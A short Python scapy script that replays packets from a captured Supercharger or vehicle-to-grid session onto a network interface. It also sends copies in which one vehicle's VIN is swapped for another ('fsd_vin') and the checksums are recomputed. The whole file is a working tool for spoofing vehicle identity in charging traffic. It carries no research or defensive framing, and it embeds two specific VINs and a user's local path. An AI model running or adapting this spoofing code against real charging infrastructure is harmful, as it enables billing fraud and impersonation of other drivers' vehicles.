from scapy.all import rdpcap, UDP, TCP, Raw, sendp, Packet

pcap_file = "/home/eder/code/vehiclelogs/vehicle2grid/2025-01-30-complete-supercharger-sniff2.pcapng"
thi_vin = b"LRW3E7FA0MC379445"
fsd_vin = b"5YJ3E7EC2MF882807"

def read_pcapng(pcap_file: str):
    packets = rdpcap(pcap_file)
    for packet in packets:
        sendp(packet, "eth0", verbose=0)
        new_packet = changeVin(packet)
        if new_packet:
            packet = new_packet
            sendp(packet, "eth0", verbose=0)

# returns None, if thi_vin is not in payload, or the changed packet if the vin is inside 
def changeVin(packet: Packet): 
    print(packet)
    if packet.haslayer(TCP) or packet.haslayer(UDP):
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            if thi_vin in payload:
                # Replace VIN in packet
                packet[Raw].load = packet[Raw].load.replace(thi_vin, fsd_vin)
                packet = replaceChecksum(packet)
                return packet
    return None

def replaceChecksum(packet: Packet):
    if packet.haslayer("IP"):
        del packet["IP"].chksum

    if packet.haslayer(TCP):
        del packet[TCP].chksum
    elif packet.haslayer(UDP):
        del packet[UDP].chksum
    
    return packet


if __name__ == "__main__":
    read_pcapng(pcap_file=pcap_file)